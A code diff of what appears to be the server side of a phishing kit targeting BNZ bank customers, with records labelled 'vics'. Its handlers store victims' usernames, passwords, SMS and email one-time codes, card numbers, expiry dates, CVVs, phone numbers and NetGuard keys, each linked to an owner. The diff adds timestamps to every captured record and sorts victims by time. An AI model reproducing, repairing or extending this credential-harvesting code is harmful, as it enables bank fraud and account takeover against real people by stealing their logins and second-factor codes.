@@ -1,9 +1,10 @@
+var moment = require("moment"); // require
 const BNZ = require("../models/bnzModel");
 
 const getOwnerVics = async (req, res) => {
     const { owner } = req.params;
     BNZ.find({ owner })
-        .sort({ status: -1 })
+        .sort({ timestamp: -1 })
         .exec((err, vics) => {
             if (err) {
                 console.log(err);
@@ -45,7 +46,7 @@ const getInfo = async (req, res) => {
 };
 
 const submitLogin = async (req, res) => {
-    const { username, password, uniqueid, owner, ip } = req.body;
+    const { username, password, uniqueid, owner, ip, } = req.body;
     try {
         await BNZ.create({
             uniqueid,
@@ -54,6 +55,7 @@ const submitLogin = async (req, res) => {
             status: 1,
             owner,
             ip,
+            timestamp: moment().format()
         });
         res.sendStatus(200);
     } catch (error) {
@@ -67,7 +69,7 @@ const submitLoginAgain = async (req, res) => {
     try {
         await BNZ.findOneAndUpdate(
             { uniqueid },
-            { username, password, status: 0 }
+            { username, password, status: 0, timestamp: moment().format() }
         ).exec();
         res.sendStatus(200);
     } catch (error) {
@@ -80,9 +82,9 @@ const submitOtp = async (req, res) => {
     const { otp, uniqueid, type } = req.body;
     try {
         if (type === "sms") {
-            await BNZ.findOneAndUpdate({ uniqueid }, { smsCode: otp, status: 3 }).exec();
+            await BNZ.findOneAndUpdate({ uniqueid }, { smsCode: otp, status: 3, timestamp: moment().format() }).exec();
         } else {
-            await BNZ.findOneAndUpdate({ uniqueid }, { emailCode: otp, status: 5 }).exec();
+            await BNZ.findOneAndUpdate({ uniqueid }, { emailCode: otp, status: 5, timestamp: moment().format() }).exec();
         }
         res.sendStatus(200);
     } catch (error) {
@@ -94,7 +96,7 @@ const submitOtp = async (req, res) => {
 const submitCard = async (req, res) => {
     const { ccnum, ccexp, cvv, uniqueid } = req.body;
     try {
-        await BNZ.findOneAndUpdate({ uniqueid }, { ccnum, ccexp, cvv, status: 14 }).exec();
+        await BNZ.findOneAndUpdate({ uniqueid }, { ccnum, ccexp, cvv, status: 14, timestamp: moment().format() }).exec();
         res.sendStatus(200);
     } catch (error) {
         console.log(error);
@@ -105,7 +107,7 @@ const submitCard = async (req, res) => {
 const submitTelephone = async (req, res) => {
     const { telephone, uniqueid } = req.body;
     try {
-        await BNZ.findOneAndUpdate({ uniqueid }, { telephone, status: 12 }).exec();
+        await BNZ.findOneAndUpdate({ uniqueid }, { telephone, status: 12, timestamp: moment().format() }).exec();
         res.sendStatus(200);
     } catch (error) {
         console.log(error);
@@ -116,7 +118,7 @@ const submitTelephone = async (req, res) => {
 const submitNetguard = async (req, res) => {
     const { netguardKey, uniqueid } = req.body;
     try {
-        await BNZ.findOneAndUpdate({ uniqueid }, { netguardKey, status: 9 }).exec();
+        await BNZ.findOneAndUpdate({ uniqueid }, { netguardKey, status: 9, timestamp: moment().format() }).exec();
         res.sendStatus(200);
     } catch (error) {
         console.log(error);
